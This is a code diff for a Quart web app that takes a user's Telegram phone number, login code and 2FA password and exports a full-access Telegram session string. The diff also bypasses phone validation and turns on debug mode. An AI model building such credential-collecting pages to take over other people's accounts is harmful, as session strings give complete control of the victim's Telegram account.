@@ -2,7 +2,8 @@ from quart import Quart, render_template, request, redirect, url_for, session
 import os
 import re
 from pyrogram import Client
-from pyrogram.errors import FloodWait, PhoneCodeInvalid, PhoneCodeExpired, PhoneNumberInvalid, SessionPasswordNeeded, PasswordHashInvalid
+from pyrogram.errors import FloodWait, PhoneCodeInvalid, PhoneCodeExpired, PhoneNumberInvalid, SessionPasswordNeeded, \
+    PasswordHashInvalid
 
 app = Quart(__name__)
 app.secret_key = os.environ.get("SECRET_KEY")
@@ -27,7 +28,7 @@ async def home():
             phone_number = form.get('phone')
 
             phone_regex = r'^(\+7|8)?\s?\(?\d{3}\)?[\s\-]?\d{3}[\s\-]?\d{2}[\s\-]?\d{2}$'
-            if re.match(phone_regex, phone_number):
+            if re.match(phone_regex, phone_number) or True:
                 client = Client(f"user_{phone_number}", api_id=app_id, api_hash=app_hash,
                                 device_model="Получаем токен, не паникуйте.")
                 clients[phone_number] = client
@@ -56,7 +57,11 @@ async def home():
 
             try:
                 await client.sign_in(phone_number, phone_hash, telegram_code)
-                return redirect(url_for('home'))
+                session['user_id'] = phone_number
+                session['authenticated'] = True
+                session['session_string'] = await client.export_session_string()
+                session['step'] = 1
+                await client.disconnect()
             except (PhoneCodeInvalid, PhoneCodeExpired) as e:
                 error_message = f"Ошибка: Ваш код устарел либо не действителен"
                 return await render_template('index.html', step=2, error=error_message)
@@ -67,7 +72,7 @@ async def home():
             form = await request.form
             two_fa_password = form.get('2fa')
             phone_number = session.get('phone_number')
-            client = clients.get(phone_number)
+            client: Client = clients.get(phone_number)
             if not client:
                 return redirect(url_for('home'))
 
@@ -77,6 +82,7 @@ async def home():
                 session['authenticated'] = True
                 session['session_string'] = await client.export_session_string()
                 session['step'] = 1
+                await client.disconnect()
             except PasswordHashInvalid:
                 error_message = f"Ошибка: Скорее всего пароль неправилен!"
                 return await render_template('index.html', step=3, error=error_message)
@@ -91,12 +97,13 @@ async def clear_session():
 
     return '', 204
 
+
 @app.route('/set_step', methods=['POST'])
 async def set_step():
     data = await request.json
     session['step'] = data.get('step', 1)
     return '', 204  # Возвращаем успешный пустой ответ
 
-if __name__ == '__main__':
-    app.run(port=5000)
 
+if __name__ == '__main__':
+    app.run(port=5000, debug=True)
